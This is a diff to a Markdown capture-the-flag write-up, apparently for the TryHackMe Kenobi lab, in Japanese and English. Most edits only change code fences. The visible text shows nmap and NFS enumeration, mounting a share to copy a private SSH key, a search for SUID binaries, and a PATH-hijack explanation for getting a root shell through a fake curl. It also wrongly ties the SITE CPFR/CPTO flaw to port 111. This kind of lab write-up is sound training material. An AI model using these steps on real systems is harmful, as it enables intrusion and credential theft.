@@ -35,14 +35,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -p- -sC -sV -T4 $ip
-```
-
-```
 ┌──(n0z0㉿galatea)-[~]
 └─$ nmap -p- -sC -sV -T4 $ip
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-09 00:21 JST
@@ -131,7 +127,7 @@ OSCPライク
 
 nmap実行
 
-```
+```bash
 ┌──(n0z0㉿galatea)-[~]
 └─$ nmap -p- -sC -sV -T4 $ip
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-09 00:21 JST
@@ -234,7 +230,6 @@ smb: \> dir
 
 中身見てみた
 
-```
 ┌──(n0z0㉿galatea)-[~/work/thm/kenobi]
 └─$ ls -la
 Total 20
@@ -442,11 +437,10 @@ AllowOverwrite          on
    read only = yes
    guest ok = yes
 
-```
 
 ポート番号111は**SITE CPFR** and **SITE CPTO**の脆弱性を使える
 
-```
+```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~]
 └─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 23:32 JST
@@ -506,7 +500,7 @@ Export list for 10.10.153.143:
 
 マウントする
 
-```
+```bash
 sudo mount -t nfs $ip:/var /mnt
 ```
 
@@ -514,9 +508,6 @@ sudo mount -t nfs $ip:/var /mnt
 
 ```
 cp /mnt/kenobiNFS/tmp/id_rsa .
-```
-
-```
 kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /sbin/mount.nfs
 /usr/lib/policykit-1/polkit-agent-helper-1
@@ -590,7 +581,6 @@ kenobi@kenobi:/tmp$ /usr/bin/menu
 
 - `menu` プログラムが `curl` コマンドを呼び出す際、`/tmp/curl` が優先的に実行され、攻撃者がシステム上でシェルを取得します。
 - もし `menu` プログラムが `root` 権限で動作している場合、シェルも `root` 権限で実行され、システム全体の制御が可能になります。
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
